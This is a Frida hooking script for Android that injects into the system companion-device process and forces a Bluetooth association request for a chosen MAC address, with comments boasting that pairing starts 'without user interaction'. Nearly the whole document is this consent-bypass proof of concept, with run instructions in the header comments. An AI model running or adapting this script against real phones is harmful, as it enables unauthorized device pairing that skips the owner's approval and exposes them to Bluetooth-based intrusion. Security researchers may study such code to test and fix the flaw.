//verify pairing using adb shell dumpsys companiondevice
//and run script as frida -U -f com.android.companion -l trigger_pairing.js 

Java.perform(function () {
    console.log("[+] Attempting to trigger device pairing manually...");

    var CompanionDeviceManager = Java.use("android.companion.CompanionDeviceManager");
    var AssociationRequest_Builder = Java.use("android.companion.AssociationRequest$Builder");
    var BluetoothDeviceFilter = Java.use("android.companion.BluetoothDeviceFilter");
    var Context = Java.use("android.content.Context");

    // Get current app context (useful for invoking system services)
    var ActivityThread = Java.use("android.app.ActivityThread");
    var currentApplication = ActivityThread.currentApplication();
    var context = currentApplication.getApplicationContext();

    // Force-set target Bluetooth MAC address (CHANGE THIS!)
    var TARGET_MAC = "00:11:22:33:44:55";
    console.log("[+] Target Device MAC: " + TARGET_MAC);

    // Create a BluetoothDeviceFilter
    var filter = BluetoothDeviceFilter.$new(null, TARGET_MAC, null, null, null, null);

    // Build an AssociationRequest with the forced device filter
    var builder = AssociationRequest_Builder.$new();
    builder.addDeviceFilter(filter);
    builder.setSingleDevice(true);  // Ensure it stops once a matching device is found

    var request = builder.build();
    console.log("[+] AssociationRequest built successfully!");

    // Get CompanionDeviceManager and call the requestAssociation method
    var cdm = context.getSystemService(Context.COMPANION_DEVICE_SERVICE);
    cdm.associate(request, null, null);
    
    console.log("[+] Device pairing process started without user interaction!");
});
